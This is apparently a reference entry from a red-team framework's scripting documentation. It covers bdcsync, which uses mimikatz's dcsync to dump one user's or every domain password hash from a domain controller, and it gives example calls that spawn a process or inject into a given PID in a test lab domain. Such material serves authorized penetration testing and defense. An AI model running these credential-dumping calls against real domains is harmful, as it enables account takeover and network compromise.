bdcsync

Use mimikatz's dcsync command to pull a user's password hash from a domain controller. This function requires a domain administrator trust relationship.

#### Arguments

`$1` - the id for the beacon. This may be an array or a single ID.

`$2` - fully qualified name of the domain

`$3` - (optional) DOMAIN\user to pull hashes for

`$4` - (optional) the PID to inject the dcsync command into or $null

`$5` - (optional) the architecture of the target PID (x86|x64) or $null

#### Note

If `$3` is left out, dcsync will dump all domain hashes.

#### Examples

Spawn a temporary process```
# dump a specific account
bdcsync($1, "PLAYLAND.testlab", "PLAYLAND\\Administrator");

# dump all accounts
bdcsync($1, "PLAYLAND.testlab");```

Inject into the specified process```
# dump a specific account
bdcsync($1, "PLAYLAND.testlab", "PLAYLAND\\Administrator", 1234, "x64");
 
# dump all accounts
bdcsync($1, "PLAYLAND.testlab", $null, 1234, "x64");```

